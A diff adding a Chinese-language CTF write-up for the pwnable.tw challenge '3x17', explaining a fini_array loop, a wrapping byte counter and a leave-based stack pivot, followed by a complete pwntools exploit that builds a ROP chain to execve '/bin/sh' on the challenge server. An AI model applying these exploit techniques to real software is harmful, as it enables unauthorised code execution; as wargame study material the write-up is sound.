@@ -272,3 +272,42 @@ assert libc.address&0xfff==0 #不知道为什么本地会频繁出现泄漏地�
 trigger(p32(0xffffffff)[:-1]+b'a'*4+p32(libc.sym['system'])+p32(exe.sym['main'])+p32(libc.search(b'/bin/sh').__next__()))
 p.interactive()
 ```
+## 3x17
+
+怎么150分的题普遍比200分的难？
+
+main函数里给的一次任意地址写肯定不够，不过我之前见过fini_array技巧，可以获取无限调用（可惜不是所有题目都有fini_array）
+
+一个很大的问题是，调用的地址需要是main函数的开头，保证rbp和rsp没问题；然而main函数中有计数变量`DAT_004b9330`，仅在该变量值为1时才能触发任意地址写。即使我们能够调用main函数无限次，也没法进入触发漏洞的分支……吗？
+
+查看汇编，发现用的是`MOVZX EAX,byte ptr [DAT_004b9330]`。这意味着256次调用后计数变量将被重置。问题自然而然就解决了。接下来的问题是，该怎么拿RCE？考虑到程序内没有控制某个函数的参数这类现成的primitive，写rop链可能是个不错的选择。但我找不到怎么泄漏栈地址
+
+事实证明我知识都学死了。瞄了一眼 https://github.com/AravGarg/pwnable.tw/tree/master/3X17 ，等一下你为什么用了leave？
+
+用gdb在调用fini_array的地方（0x0402988）下个断点，会发现此处的rbp值等于fini_array……我完全没注意这点。这不是一个天然的栈迁移吗？后面就很简单了。不过静态链接的去符号binary导致我不确定里面有没有system函数，幸好绕个圈子用execve的syscall也不难
+```py
+from pwn import *
+context.arch='amd64'
+p=remote("chall.pwnable.tw",10105)
+def arb_write(addr,value):
+    p.sendlineafter("addr:",str(addr))
+    if len(value)==0x18: #不加这个分支可能会导致远程没法正常getshell
+        p.sendafter("data:",value)
+    else:
+        p.sendlineafter("data:",value)
+fini_array=0x4b40f0
+function_fini=0x402960
+main=0x401b6d
+rdi=0x401696
+rdx_rsi=0x44a309
+syscall=0x471db5
+leave=0x401c4b
+rax=0x41e4af
+arb_write(fini_array,p64(function_fini)+p64(main))
+arb_write(fini_array+0x10,p64(0)+p64(rdi)+p64(fini_array+0x58))
+arb_write(fini_array+0x28,p64(rdx_rsi)+p64(0)+p64(0))
+arb_write(fini_array+0x40,p64(rax)+p64(constants.SYS_execve)+p64(syscall))
+arb_write(fini_array+0x58,b"/bin/sh\x00")
+arb_write(fini_array,p64(leave)+p64(rdi))
+p.interactive()
+```
